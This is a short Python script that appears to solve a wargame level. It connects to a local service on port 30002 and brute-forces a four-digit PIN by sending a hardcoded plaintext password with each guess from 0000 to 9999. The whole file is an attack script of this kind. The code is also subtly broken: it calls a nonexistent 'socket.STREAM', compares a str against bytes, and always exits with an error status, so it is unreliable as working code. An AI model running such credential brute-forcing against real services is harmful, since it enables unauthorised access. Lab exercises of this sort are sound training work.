#!/usr/bin/python3
import sys
import socket

pincode = 0
password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

try:
    #connect to server
    s = socket.socket(socket.AF_INET, socket.STREAM)
    s.connect(("127.0.0.1", 30002))

    #print welcome message
    Welcome_msg = s.recv(2048)
    print(Welcome_msg)

    #try bruteforcing
    while pincode < 10000:
        pincode_string = str(pincode).zfill(4)
        message = password+" "+pincode_string+"\n"

        #send message
        s.sendall(message.encode())
        receive_msg = s.recv(1024)

        #check result
        if "Wrong" in receive_msg:
            print("Wrong PINCODE: %s" % pincode_string)
        else:
            print(receive_msg)
            break
        pincode += 1
finally:
    sys.exit(1)